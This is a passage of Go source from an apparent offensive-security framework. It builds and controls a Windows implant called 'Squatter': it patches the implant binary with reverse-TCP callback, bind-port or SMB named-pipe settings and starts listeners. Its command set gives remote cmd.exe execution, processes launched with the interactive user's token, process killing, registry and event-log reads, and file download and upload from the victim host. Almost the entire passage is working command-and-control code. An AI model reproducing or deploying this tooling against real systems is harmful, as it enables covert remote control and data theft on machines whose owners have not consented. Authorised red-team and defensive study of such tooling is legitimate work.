	config := stringMapFromAny(req.RunMetadata["config"])
	target := firstNonEmpty(config["target.host"], "target")
	listener, err := p.PrepareListener(hovel.PrepareListenerRequest{
		RunID:     req.RunID,
		Target:    target,
		PayloadID: "squatter/windows/x86/windows-7/tcp-callback/pe-exe",
		Config:    config,
	})
	if err != nil {
		return hovel.StepExecuteResult{
			Status: "listener_failed",
			Evidence: []hovel.Evidence{{
				ID:           "ev_squatter_tcp_callback_listen_failed",
				Level:        "warning",
				Kind:         "listener.start.failed",
				SourceStepID: req.StepID,
				Message:      "Squatter TCP callback listener failed",
				Details:      map[string]any{"error": err.Error()},
			}},
		}, nil
	}
	return hovel.StepExecuteResult{
		Status: "succeeded",
		Capabilities: []hovel.Capability{{
			ID:             "cap_listener_" + sanitizeCapabilitySuffix(listener.ID),
			Type:           hovel.CapabilityTransport,
			SchemaVersion:  "v1",
			State:          "active",
			ProducerStepID: req.StepID,
			Attributes: map[string]any{
				"kind":       "tcp-listener",
				"listenerId": listener.ID,
				"host":       listener.Host,
				"port":       strconv.Itoa(listener.Port),
				"transport":  tcpCallback,
			},
		}},
		Evidence: []hovel.Evidence{{
			ID:           "ev_squatter_tcp_callback_listening",
			Level:        "info",
			Kind:         "listener.start",
			SourceStepID: req.StepID,
			Message:      "Squatter TCP callback listener started",
			Details: map[string]any{
				"listenerId": listener.ID,
				"address":    net.JoinHostPort(listener.Host, strconv.Itoa(listener.Port)),
			},
		}},
	}, nil
}

func (p Provider) executeTCPConnect(req hovel.StepExecuteRequest, transport string) (hovel.StepExecuteResult, error) {
	config := stringMapFromAny(req.RunMetadata["config"])
	if config == nil {
		config = map[string]string{}
	}
	config["payload.transport"] = transport
	target := firstNonEmpty(config["target.host"], config["tcp.host"], config["smb.host"])
	session, err := p.ConnectSession(hovel.ConnectSessionRequest{
		RunID:     req.RunID,
		Target:    target,
		PayloadID: "squatter/windows/x86/windows-7/" + transport + "/pe-exe",
		Config:    config,
	})
	if err != nil {
		return hovel.StepExecuteResult{
			Status: "unreachable",
			Evidence: []hovel.Evidence{{
				ID:           "ev_squatter_" + strings.ReplaceAll(transport, "-", "_") + "_connect_failed",
				Level:        "warning",
				Kind:         "session.connect.failed",
				SourceStepID: req.StepID,
				Message:      "Squatter " + transport + " session connection failed",
				Details:      map[string]any{"error": err.Error()},
			}},
		}, nil
	}
	state := "active"
	if session.State != "open" {
		state = session.State
	}
	return hovel.StepExecuteResult{
		Status: "succeeded",
		Sessions: []hovel.SessionRef{
			session,
		},
		Capabilities: []hovel.Capability{{
			ID:             "cap_session_" + session.ID,
			Type:           hovel.CapabilitySessionRef,
			SchemaVersion:  "v1",
			State:          state,
			ProducerStepID: req.StepID,
			Attributes: map[string]any{
				"provider":  payloadName,
				"transport": transport,
				"sessionId": session.ID,
				"target":    session.Target,
			},
		}},
		Evidence: []hovel.Evidence{{
			ID:           "ev_squatter_" + strings.ReplaceAll(transport, "-", "_") + "_connect",
			Level:        "info",
			Kind:         "session.connect",
			SourceStepID: req.StepID,
			Message:      "Squatter " + transport + " session connected",
			Details: map[string]any{
				"sessionId": session.ID,
				"target":    session.Target,
				"transport": session.Transport,
				"state":     session.State,
			},
		}},
	}, nil
}

func (p Provider) executeSMBConnect(req hovel.StepExecuteRequest) (hovel.StepExecuteResult, error) {
	config := stringMapFromAny(req.RunMetadata["config"])
	session, err := p.ConnectSession(hovel.ConnectSessionRequest{
		RunID:     req.RunID,
		Target:    firstNonEmpty(config["target.host"], config["smb.host"]),
		PayloadID: "squatter/windows/x86/windows-7/smb-named-pipe/pe-exe",
		Config:    config,
	})
	if err != nil {
		return hovel.StepExecuteResult{
			Status: "unreachable",
			Evidence: []hovel.Evidence{{
				ID:           "ev_squatter_connect_smb_failed",
				Level:        "warning",
				Kind:         "session.connect.failed",
				SourceStepID: req.StepID,
				Message:      "Squatter SMB session connection failed",
				Details: map[string]any{
					"error": err.Error(),
				},
			}},
		}, nil
	}
	return hovel.StepExecuteResult{
		Status: "succeeded",
		Sessions: []hovel.SessionRef{
			session,
		},
		Capabilities: []hovel.Capability{{
			ID:             "cap_session_" + session.ID,
			Type:           hovel.CapabilitySessionRef,
			SchemaVersion:  "v1",
			State:          "active",
			ProducerStepID: req.StepID,
			Attributes: map[string]any{
				"provider":  payloadName,
				"transport": smbNamedPipe,
				"sessionId": session.ID,
				"target":    session.Target,
			},
		}},
		Evidence: []hovel.Evidence{{
			ID:           "ev_squatter_connect_smb_open",
			Level:        "info",
			Kind:         "session.connect",
			SourceStepID: req.StepID,
			Message:      "Squatter SMB session connected",
			Details: map[string]any{
				"sessionId": session.ID,
				"target":    session.Target,
				"transport": session.Transport,
			},
		}},
	}, nil
}

func stringMapFromAny(value any) map[string]string {
	object, ok := value.(map[string]any)
	if !ok {
		return nil
	}
	out := make(map[string]string, len(object))
	for key, item := range object {
		if text, ok := item.(string); ok {
			out[key] = text
		}
	}
	return out
}

func (Provider) CleanupStep(req hovel.StepCleanupRequest) (hovel.StepCleanupResult, error) {
	return hovel.StepCleanupResult{
		Status: "cleanup_attempted_unverified",
		Evidence: []hovel.Evidence{{
			ID:           "ev_squatter_cleanup_not_implemented",
			Level:        "warning",
			Kind:         "step.cleanup.not_implemented",
			SourceStepID: req.StepID,
			Message:      "squatter step cleanup is not implemented yet",
		}},
	}, nil
}

func (Provider) ListPayloads(query hovel.PayloadQuery) ([]hovel.PayloadInfo, error) {
	transport := query.Transport
	if transport == "" {
		payloads := []hovel.PayloadInfo{}
		for _, candidate := range []string{tcpBind, tcpCallback, smbNamedPipe} {
			if info, ok := matchingPayloadInfo(query, candidate); ok {
				payloads = append(payloads, info)
			}
		}
		return payloads, nil
	}
	info, ok := matchingPayloadInfo(query, transport)
	if !ok {
		return []hovel.PayloadInfo{}, nil
	}
	return []hovel.PayloadInfo{info}, nil
}

func (Provider) ResolvePayload(query hovel.PayloadQuery) (hovel.PayloadInfo, error) {
	transport := query.Transport
	if transport == "" {
		return hovel.PayloadInfo{}, fmt.Errorf("payload transport is required")
	}
	info, ok := matchingPayloadInfo(query, transport)
	if !ok {
		return hovel.PayloadInfo{}, fmt.Errorf("payload query does not match squatter payload metadata")
	}
	return info, nil
}

func (p Provider) PrepareListener(req hovel.PrepareListenerRequest) (hovel.ListenerRef, error) {
	return p.listeningPost().PrepareListener(req)
}

func (Provider) GeneratePayload(req hovel.GeneratePayloadRequest) (hovel.PayloadArtifactSet, error) {
	body, err := loadPayloadBinary()
	if err != nil {
		return hovel.PayloadArtifactSet{}, err
	}
	body = append([]byte(nil), body...)
	if err := patchPayloadConfig(body, req); err != nil {
		return hovel.PayloadArtifactSet{}, err
	}
	sum := sha256.Sum256(body)
	artifact := hovel.PayloadArtifact{
		Name:     "squatter.exe",
		Role:     "primary",
		Kind:     string(hovel.PayloadKindPE),
		Format:   formatPEEXE,
		OS:       platform,
		Arch:     arch,
		Tags:     []string{"pe", "windows", "squatter"},
		Encoding: "base64",
		Bytes:    base64.StdEncoding.EncodeToString(body),
		Size:     int64(len(body)),
		SHA256:   hex.EncodeToString(sum[:]),
	}
	return hovel.PayloadArtifactSet{
		Primary:   artifact,
		Artifacts: []hovel.PayloadArtifact{artifact},
	}, nil
}

func patchPayloadConfig(body []byte, req hovel.GeneratePayloadRequest) error {
	offset, err := payloadConfigOffset(body)
	if err != nil {
		return err
	}

	transport := req.Config["payload.transport"]
	if transport == "" {
		if strings.Contains(req.PayloadID, "/"+smbNamedPipe+"/") {
			transport = smbNamedPipe
		} else if strings.Contains(req.PayloadID, "/"+tcpBind+"/") {
			transport = tcpBind
		} else {
			transport = tcpCallback
		}
	}
	transport = canonicalTransport(transport)

	switch transport {
	case tcpCallback:
		return patchReverseTCPConfig(body[offset:], req)
	case tcpBind:
		return patchTCPBindConfig(body[offset:], req)
	case smbNamedPipe:
		return patchNamedPipeConfig(body[offset:], req)
	default:
		return fmt.Errorf("unsupported squatter transport %q", transport)
	}
}

func payloadConfigOffset(body []byte) (int, error) {
	marker := []byte(payloadConfigMagic)
	for cursor := 0; cursor < len(body); {
		found := bytes.Index(body[cursor:], marker)
		if found < 0 {
			break
		}
		offset := cursor + found
		if looksLikePayloadConfig(body, offset) {
			return offset, nil
		}
		cursor = offset + 1
	}
	return -1, fmt.Errorf("squatter payload config marker %q not found", payloadConfigMagic)
}

func looksLikePayloadConfig(body []byte, offset int) bool {
	end := offset + payloadConfigPipeOffset + (payloadConfigPipeCharacters * 2)
	if len(body) < end {
		return false
	}
	kind := binary.LittleEndian.Uint32(body[offset+payloadConfigKindOffset:])
	if kind > payloadConfigKindTCPBind {
		return false
	}
	return utf16HasPrefix(body[offset+payloadConfigPipeOffset:end], `\\.\pipe\`)
}

func utf16HasPrefix(data []byte, prefix string) bool {
	encoded := utf16.Encode([]rune(prefix))
	if len(data) < len(encoded)*2 {
		return false
	}
	for index, value := range encoded {
		if binary.LittleEndian.Uint16(data[index*2:]) != value {
			return false
		}
	}
	return true
}

func patchTCPBindConfig(config []byte, req hovel.GeneratePayloadRequest) error {
	portText := firstNonEmpty(req.Config["payload.bind_port"], req.Config["payload.port"])
	if portText == "" {
		portText = "9100"
	}
	port, err := strconv.Atoi(portText)
	if err != nil || port < 1 || port > 65535 {
		return fmt.Errorf("payload.bind_port must be a TCP port: %q", portText)
	}
	binary.LittleEndian.PutUint32(config[payloadConfigKindOffset:], payloadConfigKindTCPBind)
	binary.LittleEndian.PutUint16(config[payloadConfigPortOffset:], uint16(port))
	return nil
}

func patchReverseTCPConfig(config []byte, req hovel.GeneratePayloadRequest) error {
	host := req.Config["payload.lhost"]
	portText := req.Config["payload.lport"]
	if req.Listener != nil {
		if req.Listener.Host != "" {
			host = req.Listener.Host
		}
		if req.Listener.Port != 0 {
			portText = strconv.Itoa(req.Listener.Port)
		}
	}
	if host == "" {
		host = "127.0.0.1"
	}
	if portText == "" {
		portText = "4444"
	}

	ip := net.ParseIP(host).To4()
	if ip == nil {
		return fmt.Errorf("payload.lhost must be an IPv4 literal for the current Squatter runtime: %q", host)
	}
	port, err := strconv.Atoi(portText)
	if err != nil || port < 1 || port > 65535 {
		return fmt.Errorf("payload.lport must be a TCP port: %q", portText)
	}

	binary.LittleEndian.PutUint32(config[payloadConfigKindOffset:], payloadConfigKindReverseTCP)
	copy(config[payloadConfigHostOffset:payloadConfigHostOffset+4], ip)
	binary.LittleEndian.PutUint16(config[payloadConfigPortOffset:], uint16(port))
	return nil
}

func patchNamedPipeConfig(config []byte, req hovel.GeneratePayloadRequest) error {
	pipe := normalizeNamedPipe(req.Config["payload.pipe"])

	encoded := utf16.Encode([]rune(pipe))
	if len(encoded) >= payloadConfigPipeCharacters {
		return fmt.Errorf("payload.pipe is too long for Squatter config")
	}

	binary.LittleEndian.PutUint32(config[payloadConfigKindOffset:], payloadConfigKindSMBPipe)
	for index := 0; index < payloadConfigPipeCharacters; index++ {
		value := uint16(0)
		if index < len(encoded) {
			value = encoded[index]
		}
		binary.LittleEndian.PutUint16(
			config[payloadConfigPipeOffset+(index*2):],
			value,
		)
	}
	return nil
}

func normalizeNamedPipe(pipe string) string {
	if pipe == "" {
		return `\\.\pipe\squatter`
	}
	if strings.HasPrefix(pipe, `\\.\pipe\`) {
		return pipe
	}
	if strings.HasPrefix(pipe, `\\`) {
		parts := strings.Split(pipe, `\`)
		if len(parts) >= 5 && strings.EqualFold(parts[3], "pipe") && parts[4] != "" {
			return `\\.\pipe\` + strings.Join(parts[4:], `\`)
		}
	}
	pipe = strings.TrimLeft(pipe, `\`)
	return `\\.\pipe\` + pipe
}

func loadPayloadBinary() ([]byte, error) {
	if override := strings.TrimSpace(os.Getenv("HOVEL_SQUATTER_EXE")); override != "" {
		body, err := os.ReadFile(override)
		if err != nil {
			return nil, fmt.Errorf("read HOVEL_SQUATTER_EXE payload override: %w", err)
		}
		return body, nil
	}
	exe := ""
	if path, err := os.Executable(); err == nil {
		exe = path
	}

	for _, candidate := range payloadBinaryCandidates(os.Getenv("RUNFILES_DIR"), exe) {
		body, err := os.ReadFile(candidate)
		if err == nil {
			return body, nil
		}
	}

	return nil, fmt.Errorf("squatter payload binary not found; run through Bazel runfiles or install the packaged provider with bin/squatter.exe")
}

func payloadBinaryCandidates(runfiles, exe string) []string {
	var candidates []string

	if runfiles != "" {
		candidates = appendRunfileCandidates(candidates, runfiles)
	}

	if exe != "" {
		exeDir := filepath.Dir(exe)
		candidates = append(candidates,
			filepath.Join(exeDir, "squatter.exe"),
			filepath.Join(filepath.Dir(exeDir), "squatter.exe"),
			filepath.Join(filepath.Dir(exeDir), "bin", "squatter.exe"),
		)
		candidates = appendRunfileCandidates(candidates, exe+".runfiles")
	}

	candidates = append(candidates,
		filepath.Join("bazel-bin", payloadRunfile),
		filepath.Join("bazel-bin", legacyPayloadRunfile),
		filepath.Join("modules", "squatter", "windows", "squatter.exe"),
		filepath.Join("payloads", "squatter", "windows", "squatter.exe"),
	)

	return candidates
}

func appendRunfileCandidates(candidates []string, root string) []string {
	return append(candidates,
		filepath.Join(root, "_main", payloadRunfile),
		filepath.Join(root, "hovel", payloadRunfile),
		filepath.Join(root, payloadRunfile),
		filepath.Join(root, "_main", legacyPayloadRunfile),
		filepath.Join(root, "hovel", legacyPayloadRunfile),
		filepath.Join(root, legacyPayloadRunfile),
	)
}

func (p Provider) ConnectSession(req hovel.ConnectSessionRequest) (hovel.SessionRef, error) {
	return p.listeningPost().ConnectSession(req)
}

func (Provider) ListPayloadCommands(hovel.PayloadCommandListRequest) ([]hovel.PayloadCommand, error) {
	return []hovel.PayloadCommand{
		{
			Name:         "wininfo",
			Summary:      "collect native Windows host facts",
			Usage:        "wininfo",
			ReadOnly:     true,
			Capabilities: []string{"host.info", "windows.info"},
		},
		{
			Name:         "process.list",
			Summary:      "list processes using the native process snapshot API",
			Usage:        "process.list",
			ReadOnly:     true,
			Capabilities: []string{"process.list", "process.tasklist"},
		},
		{
			Name:         "process.run",
			Summary:      "run a process with typed exit metadata and split stdout/stderr",
			Usage:        "process.run <command> [timeout-ms] [cwd]",
			Destructive:  true,
			Capabilities: []string{"process.exec", "process.run"},
			Arguments: []hovel.PayloadCommandArgument{
				{Name: "command", Help: "Command line", Required: true},
				{Name: "timeoutMs", Help: "Optional timeout in milliseconds"},
				{Name: "cwd", Help: "Optional working directory"},
			},
		},
		{
			Name:         "process.run_as_user",
			Summary:      "launch a process using an interactive user token",
			Usage:        "process.run_as_user <command-line> [cwd] [source-pid]",
			Destructive:  true,
			Capabilities: []string{"process.exec", "process.exec.as_user"},
			Arguments: []hovel.PayloadCommandArgument{
				{Name: "command", Help: "Command line", Required: true},
				{Name: "cwd", Help: "Optional working directory"},
				{Name: "sourcePid", Help: "Optional source process ID; defaults to active-session explorer.exe"},
			},
		},
		{
			Name:         "process.kill",
			Summary:      "terminate a process by PID",
			Usage:        "process.kill <pid>",
			Destructive:  true,
			Capabilities: []string{"process.kill"},
			Arguments: []hovel.PayloadCommandArgument{
				{Name: "pid", Help: "Process ID", Required: true},
			},
		},
		{
			Name:         "payload.status",
			Summary:      "report the installed Squatter instance status",
			Usage:        "payload.status",
			ReadOnly:     true,
			Capabilities: []string{"payload.status", "payload.lifecycle"},
		},
		{
			Name:         "payload.cleanup",
			Summary:      "request auditable Squatter self-cleanup",
			Usage:        "payload.cleanup [--delete-file] [--no-stop]",
			Destructive:  true,
			Capabilities: []string{"payload.cleanup", "payload.lifecycle"},
			Arguments: []hovel.PayloadCommandArgument{
				{Name: "--delete-file", Help: "Schedule delayed deletion of the running Squatter executable"},
				{Name: "--no-stop", Help: "Report cleanup without stopping the payload process"},
			},
		},
		{
			Name:         "file.stat",
			Summary:      "stat and SHA-256 hash a file",
			Usage:        "file.stat <path>",
			ReadOnly:     true,
			Capabilities: []string{"file.stat", "file.hash"},
			Arguments: []hovel.PayloadCommandArgument{
				{Name: "path", Help: "Remote path", Required: true},
			},
		},
		{
			Name:         "registry.query",
			Summary:      "query one registry value",
			Usage:        "registry.query <HKLM|HKCU|HKCR|HKU> <key> [value]",
			ReadOnly:     true,
			Capabilities: []string{"registry.query"},
			Arguments: []hovel.PayloadCommandArgument{
				{Name: "hive", Help: "Registry hive", Required: true},
				{Name: "key", Help: "Registry key path", Required: true},
				{Name: "value", Help: "Optional registry value"},
			},
		},
		{
			Name:         "eventlog.query",
			Summary:      "read recent Windows event log records",
			Usage:        "eventlog.query <log> [limit]",
			ReadOnly:     true,
			Capabilities: []string{"eventlog.query"},
			Arguments: []hovel.PayloadCommandArgument{
				{Name: "log", Help: "Event log name such as System or Application", Required: true},
				{Name: "limit", Help: "Optional record limit"},
			},
		},
		{
			Name:         "drive.list",
			Summary:      "list logical drives",
			Usage:        "drive.list",
			ReadOnly:     true,
			Capabilities: []string{"drive.list"},
		},
		{
			Name:         "share.list",
			Summary:      "list local Windows shares",
			Usage:        "share.list",
			ReadOnly:     true,
			Capabilities: []string{"share.list"},
		},
		{
			Name:         "acl.stat",
			Summary:      "return owner and DACL as SDDL for a path",
			Usage:        "acl.stat <path>",
			ReadOnly:     true,
			Capabilities: []string{"acl.stat"},
			Arguments: []hovel.PayloadCommandArgument{
				{Name: "path", Help: "Remote path", Required: true},
			},
		},
		{
			Name:         "getfile",
			Summary:      "download a file from Squatter",
			Usage:        "getfile <remote>",
			ReadOnly:     true,
			Capabilities: []string{"file.get"},
			Arguments: []hovel.PayloadCommandArgument{
				{Name: "remote", Help: "Remote path", Required: true},
			},
		},
		{
			Name:         "putfile",
			Summary:      "upload a file to Squatter",
			Usage:        "putfile <remote>",
			Destructive:  true,
			Capabilities: []string{"file.put"},
			Arguments: []hovel.PayloadCommandArgument{
				{Name: "remote", Help: "Remote path", Required: true},
			},
		},
		{
			Name:         "cmd",
			Summary:      "run one command through cmd.exe",
			Usage:        "cmd <command>",
			Destructive:  true,
			Capabilities: []string{"process.exec"},
			Arguments: []hovel.PayloadCommandArgument{
				{Name: "command", Help: "Command line", Required: true},
			},
		},
	}, nil
}

func (p Provider) RunPayloadCommand(req hovel.PayloadCommandRequest) (hovel.PayloadCommandResult, error) {
	conn, reader, err := p.payloadCommandConn(req)
	if err != nil {
		return hovel.PayloadCommandResult{}, err
	}
	defer func() { logProviderError("close payload command connection", conn.Close()) }()
	return runPayloadCommandOnTransport(conn, reader, 1, req)
}

func runPayloadCommandOnTransport(conn io.Writer, reader *bufio.Reader, sid uint64, req hovel.PayloadCommandRequest) (hovel.PayloadCommandResult, error) {
	switch req.Command {
	case "getfile":
		return runGetfileCommand(conn, reader, sid, req)
	case "putfile":
		return runPutfileCommand(conn, reader, sid, req)
	case "cmd":
		return runCmdCommand(conn, reader, sid, req)
	case "wininfo", "process.list", "process.kill", "payload.status", "payload.cleanup", "file.stat", "registry.query",
		"eventlog.query", "drive.list", "share.list", "acl.stat":
		return runJSONPayloadCommand(conn, reader, sid, req, req.Command, req.Args)
	case "process.run":
		return runProcessRunCommand(conn, reader, sid, req)
	case "process.run_as_user":
		return runProcessRunAsUserCommand(conn, reader, sid, req)
	default:
		return hovel.PayloadCommandResult{}, fmt.Errorf("unsupported Squatter payload command %q", req.Command)
	}
}

func (p Provider) CleanupPayload(req hovel.CleanupPayloadRequest) (hovel.CleanupResult, error) {
	cleanup, err := p.listeningPost().Cleanup(req)
	if err != nil {
		return cleanup, err
	}
	if req.Cleanup == nil {
		return cleanup, nil
	}
	args := []string{}
	if req.Cleanup.Descriptor["remotePath"] != nil {
		args = append(args, "--delete-file")
	}
	config := recordDescriptorStringMap(req.Cleanup)
	_, err = p.RunPayloadCommand(hovel.PayloadCommandRequest{
		InstalledPayloadID: req.InstalledPayloadID,
		Target:             req.Target,
		PayloadID:          req.PayloadID,
		Command:            "payload.cleanup",
		Args:               args,
		Config:             config,
		Agent:              req.Agent,
	})
	logProviderError("run payload cleanup command", err)
	return cleanup, nil
}

func (Provider) ReadPayloadChunk(req hovel.ReadPayloadChunkRequest) (hovel.PayloadChunk, error) {
	return hovel.PayloadChunk{
		Handle:   req.Handle,
		Offset:   req.Offset,
		Data:     "",
		EOF:      true,
		Encoding: "base64",
	}, nil
}

func (p Provider) payloadCommandConn(req hovel.PayloadCommandRequest) (io.ReadWriteCloser, *bufio.Reader, error) {
	connectReq := requestWithReconnectRecord(hovel.ConnectSessionRequest{
		Target:             req.Target,
		PayloadID:          req.PayloadID,
		InstalledPayloadID: req.InstalledPayloadID,
		Config:             req.Config,
		Reconnect:          req.Reconnect,
		Agent:              req.Agent,
	})
	lp := p.listeningPost()
	var conn io.ReadWriteCloser
	var err error
	switch canonicalTransport(connectReq.Config["payload.transport"]) {
	case tcpBind:
		conn, err = lp.connectTCPBind(connectReq)
	case smbNamedPipe:
		conn, err = lp.connectSMB(connectReq)
	default:
		err = fmt.Errorf("payload command transport %q is not supported", connectReq.Config["payload.transport"])
	}
	if err != nil {
		return nil, nil, err
	}
	return conn, bufio.NewReader(conn), nil
}

func runGetfileCommand(conn io.Writer, reader *bufio.Reader, sid uint64, req hovel.PayloadCommandRequest) (hovel.PayloadCommandResult, error) {
	if len(req.Args) < 1 || strings.TrimSpace(req.Args[0]) == "" {
		return hovel.PayloadCommandResult{}, fmt.Errorf("getfile requires remote path")
	}
	remote := req.Args[0]
	file, err := os.CreateTemp("", "hovel-squatter-getfile-*")
	if err != nil {
		return hovel.PayloadCommandResult{}, err
	}
	path := file.Name()
	n, err := xfer.GetFile(conn, reader, sid, remote, file)
	closeErr := file.Close()
	if err != nil {
		logProviderError("remove partial getfile artifact", os.Remove(path))
		return hovel.PayloadCommandResult{}, err
	}
	if closeErr != nil {
		logProviderError("remove failed getfile artifact", os.Remove(path))
		return hovel.PayloadCommandResult{}, closeErr
	}
	name := filepath.Base(strings.ReplaceAll(remote, "\\", "/"))
	if name == "" || name == "." {
		name = "squatter-download.bin"
	}
	return hovel.PayloadCommandResult{
		Command: "getfile",
		Summary: fmt.Sprintf("downloaded %d bytes from %s", n, remote),
		Artifacts: []hovel.Artifact{
			hovel.FileArtifact(name, "application/octet-stream", path),
		},
		Fields: map[string]string{"remote": remote, "bytes": strconv.FormatInt(n, 10)},
	}, nil
}

func runPutfileCommand(conn io.Writer, reader *bufio.Reader, sid uint64, req hovel.PayloadCommandRequest) (hovel.PayloadCommandResult, error) {
	if len(req.Args) < 1 || strings.TrimSpace(req.Args[0]) == "" {
		return hovel.PayloadCommandResult{}, fmt.Errorf("putfile requires remote path")
	}
	remote := req.Args[0]
	src, closeSrc, err := payloadCommandInput(req)
	if err != nil {
		return hovel.PayloadCommandResult{}, err
	}
	defer closeSrc()
	sent, ack, err := xfer.PutFile(conn, reader, sid, src, remote)
	if err != nil {
		return hovel.PayloadCommandResult{}, err
	}
	return hovel.PayloadCommandResult{
		Command: "putfile",
		Summary: fmt.Sprintf("uploaded %d bytes to %s", sent, remote),
		Stdout:  ack,
		Fields:  map[string]string{"remote": remote, "bytes": strconv.FormatInt(sent, 10)},
	}, nil
}

func payloadCommandInput(req hovel.PayloadCommandRequest) (io.Reader, func(), error) {
	if req.InputPath != "" {
		file, err := os.Open(req.InputPath)
		if err != nil {
			return nil, func() {}, err
		}
		return file, func() { logProviderError("close payload command input file", file.Close()) }, nil
	}
	switch strings.ToLower(strings.TrimSpace(req.InputEncoding)) {
	case "", "utf-8", "text":
		return strings.NewReader(req.InputData), func() {}, nil
	case "base64":
		data, err := base64.StdEncoding.DecodeString(req.InputData)
		if err != nil {
			return nil, func() {}, err
		}
		return bytes.NewReader(data), func() {}, nil
	default:
		return nil, func() {}, fmt.Errorf("unsupported input encoding %q", req.InputEncoding)
	}
}

func runCmdCommand(conn io.Writer, reader *bufio.Reader, sid uint64, req hovel.PayloadCommandRequest) (hovel.PayloadCommandResult, error) {
	if len(req.Args) < 1 || strings.TrimSpace(req.Args[0]) == "" {
		return hovel.PayloadCommandResult{}, fmt.Errorf("cmd requires command line")
	}
	if deadline, ok := conn.(interface{ SetDeadline(time.Time) error }); ok {
		logProviderError("set cmd payload command deadline", deadline.SetDeadline(time.Now().Add(15*time.Second)))
		defer func() { logProviderError("clear cmd payload command deadline", deadline.SetDeadline(time.Time{})) }()
	}
	command := req.Args[0]
	if err := wire.WriteFrame(conn, wire.KindOpen, sid, wire.EncodeOpen("cmd", []string{command})); err != nil {
		return hovel.PayloadCommandResult{}, err
	}
	var out bytes.Buffer
	for {
		kind, _, payload, err := wire.ReadFrame(reader)
		if err != nil {
			return hovel.PayloadCommandResult{}, err
		}
		switch kind {
		case wire.KindClose:
			return hovel.PayloadCommandResult{
				Command: "cmd",
				Summary: "command completed",
				Stdout:  out.String(),
				Fields:  map[string]string{"command": command},
			}, nil
		case wire.KindData:
			if _, err := out.Write(payload); err != nil {
				return hovel.PayloadCommandResult{}, err
			}
		}
	}
}

func runJSONPayloadCommand(conn io.Writer, reader *bufio.Reader, sid uint64, req hovel.PayloadCommandRequest, module string, args []string) (hovel.PayloadCommandResult, error) {
	if deadline, ok := conn.(interface{ SetDeadline(time.Time) error }); ok {
		logProviderError("set JSON payload command deadline", deadline.SetDeadline(time.Now().Add(payloadCommandTimeout(req))))
		defer func() { logProviderError("clear JSON payload command deadline", deadline.SetDeadline(time.Time{})) }()
	}
	if err := wire.WriteFrame(conn, wire.KindOpen, sid, wire.EncodeOpen(module, args)); err != nil {
		return hovel.PayloadCommandResult{}, err
	}
	var out bytes.Buffer
	fields := map[string]string{"module": module}
	var streamErr string
	for {
		kind, _, payload, err := wire.ReadFrame(reader)
		if err != nil {
			return hovel.PayloadCommandResult{}, err
		}
		switch kind {
		case wire.KindClose:
			if streamErr != "" {
				return hovel.PayloadCommandResult{}, fmt.Errorf("%s failed: %s", module, streamErr)
			}
			return hovel.PayloadCommandResult{
				Command: req.Command,
				Summary: payloadCommandSummary(req.Command),
				Stdout:  out.String(),
				Fields:  fields,
			}, nil
		case wire.KindData:
			if _, err := out.Write(payload); err != nil {
				return hovel.PayloadCommandResult{}, err
			}
		case wire.KindControl:
			event, err := wire.DecodeStreamEvent(payload)
			if err != nil {
				continue
			}
			switch event.Kind {
			case wire.EventError:
				streamErr = event.Message
				if streamErr == "" {
					streamErr = fmt.Sprintf("event error code %d", event.Code)
				}
			case wire.EventExited:
				fields["exitCode"] = strconv.FormatUint(uint64(event.Code), 10)
			}
		}
	}
}

func runProcessRunCommand(conn io.Writer, reader *bufio.Reader, sid uint64, req hovel.PayloadCommandRequest) (hovel.PayloadCommandResult, error) {
	if len(req.Args) < 1 || strings.TrimSpace(req.Args[0]) == "" {
		return hovel.PayloadCommandResult{}, fmt.Errorf("process.run requires command line")
	}
	result, err := runJSONPayloadCommand(conn, reader, sid, req, "process.run", req.Args)
	if err != nil {
		return hovel.PayloadCommandResult{}, err
	}
	var parsed struct {
		Command  string `json:"command"`
		PID      int    `json:"pid"`
		ExitCode int    `json:"exitCode"`
		TimedOut bool   `json:"timedOut"`
		Stdout   string `json:"stdout"`
		Stderr   string `json:"stderr"`
	}
	if err := json.Unmarshal([]byte(result.Stdout), &parsed); err != nil {
		result.Summary = "process completed; raw JSON returned"
		return result, nil
	}
	result.Summary = "process completed"
	result.Stdout = parsed.Stdout
	result.Stderr = parsed.Stderr
	result.Fields = map[string]string{
		"command":  parsed.Command,
		"pid":      strconv.Itoa(parsed.PID),
		"exitCode": strconv.Itoa(parsed.ExitCode),
		"timedOut": strconv.FormatBool(parsed.TimedOut),
	}
	return result, nil
}

func runProcessRunAsUserCommand(conn io.Writer, reader *bufio.Reader, sid uint64, req hovel.PayloadCommandRequest) (hovel.PayloadCommandResult, error) {
	if len(req.Args) < 1 || strings.TrimSpace(req.Args[0]) == "" {
		return hovel.PayloadCommandResult{}, fmt.Errorf("process.run_as_user requires command line")
	}
	result, err := runJSONPayloadCommand(conn, reader, sid, req, "process.run_as_user", req.Args)
	if err != nil {
		return hovel.PayloadCommandResult{}, err
	}
	var parsed struct {
		PID             int     `json:"pid"`
		SourcePID       int     `json:"sourcePid"`
		SessionID       *int    `json:"sessionId"`
		Command         string  `json:"command"`
		CWD             *string `json:"cwd"`
		UsedEnvironment bool    `json:"usedEnvironment"`
	}
	if err := json.Unmarshal([]byte(result.Stdout), &parsed); err != nil {
		result.Summary = "process launched as interactive user; raw JSON returned"
		return result, nil
	}
	fields := map[string]string{
		"command":         parsed.Command,
		"pid":             strconv.Itoa(parsed.PID),
		"sourcePid":       strconv.Itoa(parsed.SourcePID),
		"usedEnvironment": strconv.FormatBool(parsed.UsedEnvironment),
	}
	if parsed.SessionID != nil {
		fields["sessionId"] = strconv.Itoa(*parsed.SessionID)
	}
	if parsed.CWD != nil {
		fields["cwd"] = *parsed.CWD
	}
	result.Summary = "process launched as interactive user"
	result.Fields = fields
	return result, nil
}

func payloadCommandTimeout(req hovel.PayloadCommandRequest) time.Duration {
	if req.Command == "process.run" && len(req.Args) > 1 {
		if ms, err := strconv.Atoi(req.Args[1]); err == nil && ms > 0 {
			return time.Duration(ms+5000) * time.Millisecond
		}
	}
	return 30 * time.Second
}

func payloadCommandSummary(command string) string {
	switch command {
	case "wininfo":
		return "Windows host facts collected"
	case "process.list":
		return "process list collected"
	case "process.kill":
		return "process termination requested"
	case "process.run_as_user":
		return "process launched as interactive user"
	case "payload.status":
		return "payload status collected"
	case "payload.cleanup":
		return "payload cleanup requested"
	case "file.stat":
		return "file evidence collected"
	case "registry.query":
		return "registry value collected"
	case "eventlog.query":
		return "event log records collected"
	case "drive.list":
		return "drive list collected"
	case "share.list":
		return "share list collected"
	case "acl.stat":
		return "ACL evidence collected"
	default:
		return "payload command completed"
	}
}

func recordDescriptorStringMap(record *hovel.PayloadProviderRecord) map[string]string {
	if record == nil {
		return nil
	}
	out := map[string]string{}
	for key, value := range record.Descriptor {
		if text := fmt.Sprint(value); text != "" {
